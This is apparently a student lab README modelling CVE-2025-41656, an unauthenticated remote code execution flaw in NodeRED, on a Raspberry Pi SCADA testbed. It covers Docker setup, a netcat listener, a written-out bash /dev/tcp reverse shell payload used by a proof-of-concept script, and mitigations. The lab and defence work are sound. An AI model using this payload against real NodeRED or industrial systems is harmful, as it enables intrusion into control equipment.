# CVE-2025-41656

## Project Summary
This project exists to model **CVE-2025-41656**, an unauthenticated remote code execution vulnerability for NodeRED. To model this vulnerability, we created a small form factor SCADA system with a raspberry pi, an actuator, and a sensor. The raspberry pi contains a NodeRED and OpenPLC container that communicate with eachother over Modbus TCP to control the actuator. This is a python proof of concept script to carry out the CVE-2025-41656 attack. The goal is to successfully create a PoC and find remediations to secure the system.

## Getting started
### The lab will include the following pieces
- Rasberry Pi 3b+
- Docker compose file with NodeRED and OpenPLC containers
- An actuator
- A sensor
- A motorized device controlled by the actuator
- Note: Setup will be different depending on what hardware you have. Adjust accordingly.

### Software Installation
```
git clone git@github.com:wallyschag/CVE-2025-41656.git
cd CVE-2025-41656
git clone https://github.com/thiagoralves/OpenPLC_v3.git
```
### Docker Setup
```
rm OpenPLC_v3/Dockerfile && cp Dockerfile_WiringPi OpenPLC_v3/Dockerfile
docker compose up --build -d
```
- Verify docker containers and network bridge are up and running
```
docker container ls
docker network inspect csci587-final-project_scadanet
```
- Both docker containers should be up.
- Also make sure both containers are network connected and have an assigned IP address.

## The exploit
- On host machine run `nc -lvnp 1234`
- Change the `NODE_RED_IP` and `NODE_RED_PORT` with the IP address and port (1880) of your NodeRED service in `cve_2025_41656.py`.
- Inside `cve_2025_41656` change the IP address in the line `"command": "bash -c 'bash -i >& /dev/tcp/192.168.4.223/1234 0>&1'",` to the IP address of the machine you are launching the exploit from.
```
python3 cve_2025_41656.py
```
- You should now have a reverse shell on the NodeRED container.

## Mitigation Strategies
- Implement TLS and an authentication mechanism for NodeRED.
- Segment SCADA networks to prevent unauthorized access to NodeRED.
- Monitor networks containing NodeRED with IDS/IPS systems looking for reverse shell traffic.
